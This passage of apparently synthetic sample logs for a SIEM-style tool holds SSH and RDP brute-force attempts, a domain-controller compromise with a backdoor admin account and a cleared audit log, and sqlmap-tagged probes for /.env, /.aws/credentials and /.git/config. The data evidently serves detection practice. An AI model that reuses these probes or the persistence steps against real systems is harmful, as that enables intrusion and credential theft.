Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:13:04 +0100] \"GET /index.html HTTP/1.1\" 200 3685 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:16:39 +0100] \"GET /contact HTTP/1.1\" 200 874 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n", "win": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:12Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:20Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:35Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:50Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:56Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:09Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:14Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:24Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:38Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:50Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:02:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:02:05Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:06Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:17Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:26Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:34Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:44Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:51Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T02:21:01Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4720</EventID><TimeCreated SystemTime=\"2026-11-08T02:25:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">svc_backup</Data><Data Name=\"SubjectUserName\">administrateur</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4732</EventID><TimeCreated SystemTime=\"2026-11-08T02:25:20Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">Administrators</Data><Data Name=\"MemberName\">svc_backup</Data><Data Name=\"SubjectUserName\">administrateur</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>1102</EventID><TimeCreated SystemTime=\"2026-11-08T02:40:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"SubjectUserName\">administrateur</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T03:12:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T08:50:16Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T08:55:39Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T09:14:16Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T09:21:45Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T10:15:54Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T10:39:45Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T11:42:01Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T11:54:57Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n"};
+  root.MINISIEM_SAMPLES = {"auth": "Nov  8 09:01:38 web01 sshd[5179]: Accepted password for carol from 192.168.1.20 port 43863 ssh2\nNov  8 09:05:58 web01 sshd[7219]: Accepted password for bob from 10.0.0.5 port 46879 ssh2\nNov  8 09:06:03 web01 sudo[1464]:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:09:47 web01 sshd[1034]: Accepted password for bob from 10.0.0.5 port 54594 ssh2\nNov  8 09:09:52 web01 sudo[4748]:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:15:19 web01 sshd[1501]: Accepted password for alice from 192.168.1.21 port 40731 ssh2\nNov  8 09:15:24 web01 sudo[9870]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:15:53 web01 sshd[4548]: Accepted password for bob from 10.0.0.5 port 53831 ssh2\nNov  8 09:20:53 web01 sshd[9123]: Accepted password for alice from 192.168.1.21 port 58116 ssh2\nNov  8 09:20:58 web01 sudo[4782]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:27:09 web01 sshd[5747]: Accepted password for alice from 192.168.1.21 port 40704 ssh2\nNov  8 09:32:23 web01 sshd[4045]: Accepted password for carol from 192.168.1.20 port 49712 ssh2\nNov  8 09:32:28 web01 sudo[6450]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:35:08 web01 sshd[9259]: Failed password for invalid user test from 203.0.113.66 port 56377 ssh2\nNov  8 09:35:10 web01 sshd[7591]: Failed password for invalid user test from 203.0.113.66 port 49219 ssh2\nNov  8 09:35:12 web01 sshd[4290]: Failed password for admin from 203.0.113.66 port 50739 ssh2\nNov  8 09:35:16 web01 sshd[8032]: Failed password for invalid user test from 203.0.113.66 port 46980 ssh2\nNov  8 09:35:22 web01 sshd[7213]: Failed password for root from 203.0.113.66 port 57944 ssh2\nNov  8 09:35:29 web01 sshd[8938]: Failed password for ubuntu from 203.0.113.66 port 57449 ssh2\nNov  8 09:35:34 web01 sshd[1661]: Failed password for root from 203.0.113.66 port 42774 ssh2\nNov  8 09:35:38 web01 sshd[3728]: Failed password for admin from 203.0.113.66 port 57636 ssh2\nNov  8 09:35:43 web01 sshd[6443]: Failed password for invalid user test from 203.0.113.66 port 59667 ssh2\nNov  8 09:35:53 web01 sshd[7031]: Failed password for invalid user test from 203.0.113.66 port 51103 ssh2\nNov  8 09:36:00 web01 sshd[5771]: Failed password for root from 203.0.113.66 port 47706 ssh2\nNov  8 09:36:09 web01 sshd[2708]: Failed password for admin from 203.0.113.66 port 50509 ssh2\nNov  8 09:36:11 web01 sshd[2199]: Failed password for invalid user oracle from 203.0.113.66 port 52459 ssh2\nNov  8 09:36:15 web01 sshd[6585]: Failed password for admin from 203.0.113.66 port 43758 ssh2\nNov  8 09:36:23 web01 sshd[4665]: Failed password for root from 203.0.113.66 port 58545 ssh2\nNov  8 09:36:26 web01 sshd[6978]: Failed password for invalid user test from 203.0.113.66 port 49684 ssh2\nNov  8 09:36:36 web01 sshd[8500]: Failed password for root from 203.0.113.66 port 49082 ssh2\nNov  8 09:36:39 web01 sshd[5845]: Failed password for root from 203.0.113.66 port 40405 ssh2\nNov  8 09:36:41 web01 sshd[7775]: Failed password for root from 203.0.113.66 port 43771 ssh2\nNov  8 09:36:43 web01 sshd[4926]: Failed password for admin from 203.0.113.66 port 59228 ssh2\nNov  8 09:36:51 web01 sshd[2893]: Failed password for admin from 203.0.113.66 port 54775 ssh2\nNov  8 09:36:55 web01 sshd[3604]: Failed password for admin from 203.0.113.66 port 43369 ssh2\nNov  8 09:37:03 web01 sshd[9895]: Failed password for invalid user oracle from 203.0.113.66 port 49634 ssh2\nNov  8 09:37:13 web01 sshd[8815]: Failed password for invalid user test from 203.0.113.66 port 50304 ssh2\nNov  8 09:37:16 web01 sshd[6200]: Failed password for admin from 203.0.113.66 port 41298 ssh2\nNov  8 09:39:02 web01 sshd[7915]: Accepted password for carol from 10.0.0.5 port 56636 ssh2\nNov  8 09:45:15 web01 sshd[5655]: Accepted password for alice from 192.168.1.21 port 59253 ssh2\nNov  8 09:50:00 web01 sshd[1565]: Accepted password for carol from 192.168.1.21 port 55736 ssh2\nNov  8 09:50:03 web01 sshd[1172]: Failed password for admin from 198.51.100.23 port 49684 ssh2\nNov  8 09:50:05 web01 sudo[7623]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 09:50:15 web01 sshd[6246]: Failed password for admin from 198.51.100.23 port 54740 ssh2\nNov  8 09:50:24 web01 sshd[6132]: Failed password for admin from 198.51.100.23 port 53059 ssh2\nNov  8 09:50:28 web01 sshd[2051]: Failed password for admin from 198.51.100.23 port 50398 ssh2\nNov  8 09:50:40 web01 sshd[8468]: Failed password for admin from 198.51.100.23 port 43649 ssh2\nNov  8 09:50:47 web01 sshd[4525]: Failed password for admin from 198.51.100.23 port 57790 ssh2\nNov  8 09:50:57 web01 sshd[6829]: Failed password for admin from 198.51.100.23 port 48489 ssh2\nNov  8 09:51:02 web01 sshd[9873]: Failed password for admin from 198.51.100.23 port 46810 ssh2\nNov  8 09:51:11 web01 sshd[6035]: Accepted password for admin from 198.51.100.23 port 46527 ssh2\nNov  8 09:54:02 web01 sshd[7014]: Accepted password for carol from 192.168.1.20 port 57983 ssh2\nNov  8 09:58:00 web01 sudo[4812]:  www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\nNov  8 10:00:17 web01 sshd[2416]: Accepted password for carol from 192.168.1.21 port 54383 ssh2\nNov  8 10:01:42 web01 sshd[7443]: Accepted password for alice from 10.0.0.5 port 52141 ssh2\nNov  8 10:02:27 web01 sshd[6054]: Accepted password for bob from 192.168.1.20 port 59437 ssh2\nNov  8 10:02:51 web01 sshd[6905]: Failed password for root from 203.0.113.200 port 42666 ssh2\nNov  8 10:03:46 web01 sshd[2464]: Failed password for root from 203.0.113.200 port 54676 ssh2\nNov  8 10:04:17 web01 sshd[6552]: Failed password for root from 203.0.113.200 port 47452 ssh2\nNov  8 10:08:28 web01 sshd[9228]: Accepted password for alice from 192.168.1.20 port 47436 ssh2\nNov  8 10:10:40 web01 sshd[4803]: Accepted password for carol from 10.0.0.5 port 53253 ssh2\nNov  8 10:16:05 web01 sshd[5411]: Accepted password for bob from 192.168.1.21 port 57956 ssh2\nNov  8 10:16:37 web01 sshd[9396]: Accepted password for bob from 10.0.0.5 port 44235 ssh2\nNov  8 10:21:54 web01 sshd[1919]: Accepted password for alice from 192.168.1.21 port 55764 ssh2\nNov  8 10:27:15 web01 sshd[9269]: Accepted password for carol from 192.168.1.20 port 53546 ssh2\nNov  8 10:30:47 web01 sshd[1025]: Accepted password for bob from 192.168.1.21 port 57644 ssh2\nNov  8 10:36:30 web01 sshd[1458]: Accepted password for bob from 192.168.1.21 port 47523 ssh2\nNov  8 10:41:41 web01 sshd[2500]: Accepted password for carol from 192.168.1.20 port 58056 ssh2\nNov  8 10:44:21 web01 sshd[2154]: Accepted password for alice from 10.0.0.5 port 42727 ssh2\nNov  8 10:48:42 web01 sshd[5088]: Accepted password for alice from 192.168.1.21 port 48802 ssh2\nNov  8 10:48:47 web01 sudo[4024]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 10:52:08 web01 sshd[3743]: Accepted password for bob from 192.168.1.20 port 45230 ssh2\nNov  8 10:52:13 web01 sudo[3754]:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 10:58:14 web01 sshd[5824]: Accepted password for bob from 10.0.0.5 port 54899 ssh2\nNov  8 11:02:58 web01 sshd[1387]: Accepted password for bob from 192.168.1.20 port 50223 ssh2\nNov  8 11:07:03 web01 sshd[2781]: Accepted password for alice from 192.168.1.21 port 48305 ssh2\nNov  8 11:11:54 web01 sshd[8072]: Accepted password for alice from 10.0.0.5 port 40682 ssh2\nNov  8 11:11:59 web01 sudo[7509]:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:13:38 web01 sshd[3625]: Accepted password for alice from 10.0.0.5 port 54603 ssh2\nNov  8 11:19:55 web01 sshd[4614]: Accepted password for bob from 10.0.0.5 port 56927 ssh2\nNov  8 11:24:53 web01 sshd[7470]: Accepted password for carol from 192.168.1.20 port 58869 ssh2\nNov  8 11:31:00 web01 sshd[1963]: Accepted password for carol from 192.168.1.21 port 49784 ssh2\nNov  8 11:31:05 web01 sudo[4475]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:31:54 web01 sshd[2252]: Accepted password for bob from 192.168.1.20 port 50169 ssh2\nNov  8 11:34:56 web01 sshd[7818]: Accepted password for carol from 192.168.1.20 port 58511 ssh2\nNov  8 11:35:01 web01 sudo[1138]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:40:13 web01 sshd[4565]: Accepted password for alice from 10.0.0.5 port 58686 ssh2\nNov  8 11:46:43 web01 sshd[1613]: Accepted password for carol from 10.0.0.5 port 52385 ssh2\nNov  8 11:46:48 web01 sudo[2622]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\nNov  8 11:48:58 web01 sshd[8093]: Accepted password for carol from 10.0.0.5 port 59379 ssh2\nNov  8 11:49:03 web01 sudo[2710]:  carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update\n", "web": "192.168.1.21 - - [08/Nov/2026:09:03:39 +0100] \"GET / HTTP/1.1\" 200 1540 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:05:34 +0100] \"GET /css/site.css HTTP/1.1\" 200 3859 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:08:29 +0100] \"GET /about HTTP/1.1\" 200 613 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:09:13:27 +0100] \"GET /css/site.css HTTP/1.1\" 200 3507 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:14:34 +0100] \"GET /index.html HTTP/1.1\" 200 283 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:16:58 +0100] \"GET / HTTP/1.1\" 200 1297 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:09:17:54 +0100] \"GET / HTTP/1.1\" 200 288 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:18:19 +0100] \"GET /about HTTP/1.1\" 200 2220 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:22:39 +0100] \"GET / HTTP/1.1\" 200 2253 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:25:46 +0100] \"GET /css/site.css HTTP/1.1\" 200 2924 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:27:34 +0100] \"GET /index.html HTTP/1.1\" 200 779 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:30:37 +0100] \"GET / HTTP/1.1\" 200 3105 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:09:35:20 +0100] \"GET /about HTTP/1.1\" 200 717 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:09:37:25 +0100] \"GET /css/site.css HTTP/1.1\" 200 3929 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:38:01 +0100] \"GET /css/site.css HTTP/1.1\" 200 3492 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n203.0.113.9 - - [08/Nov/2026:09:40:02 +0100] \"GET /server-status?id=0 HTTP/1.1\" 404 3922 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:04 +0100] \"GET /phpmyadmin/?id=1 HTTP/1.1\" 404 2660 \"-\" \"sqlmap/1.7.2#dev\"\n192.168.1.20 - - [08/Nov/2026:09:40:06 +0100] \"GET /about HTTP/1.1\" 200 1972 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n203.0.113.9 - - [08/Nov/2026:09:40:07 +0100] \"GET /config.php.bak HTTP/1.1\" 404 2905 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:09 +0100] \"GET /.git/config?id=3 HTTP/1.1\" 404 3270 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:12 +0100] \"GET /.env HTTP/1.1\" 404 2364 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:14 +0100] \"GET /api/v1/users?id=5 HTTP/1.1\" 404 2770 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:17 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 1046 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:18 +0100] \"GET /.git/config?id=7 HTTP/1.1\" 404 1021 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:20 +0100] \"GET /.git/config HTTP/1.1\" 404 1227 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:23 +0100] \"GET /server-status HTTP/1.1\" 404 3512 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:24 +0100] \"GET /.aws/credentials HTTP/1.1\" 404 1920 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:25 +0100] \"GET /xmlrpc.php?id=11 HTTP/1.1\" 404 3800 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:27 +0100] \"GET /phpmyadmin/?id=12 HTTP/1.1\" 404 642 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:28 +0100] \"GET /wp-admin/ HTTP/1.1\" 404 254 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:31 +0100] \"GET /.git/config HTTP/1.1\" 404 3317 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:34 +0100] \"GET /login.php?id=15 HTTP/1.1\" 404 2249 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:36 +0100] \"GET /api/v1/users HTTP/1.1\" 404 1990 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:39 +0100] \"GET /login.php HTTP/1.1\" 404 2364 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:41 +0100] \"GET /.env?id=18 HTTP/1.1\" 404 3140 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:43 +0100] \"GET /backup.zip HTTP/1.1\" 404 1835 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:45 +0100] \"GET /xmlrpc.php HTTP/1.1\" 404 2540 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:47 +0100] \"GET /wp-admin/ HTTP/1.1\" 404 1746 \"-\" 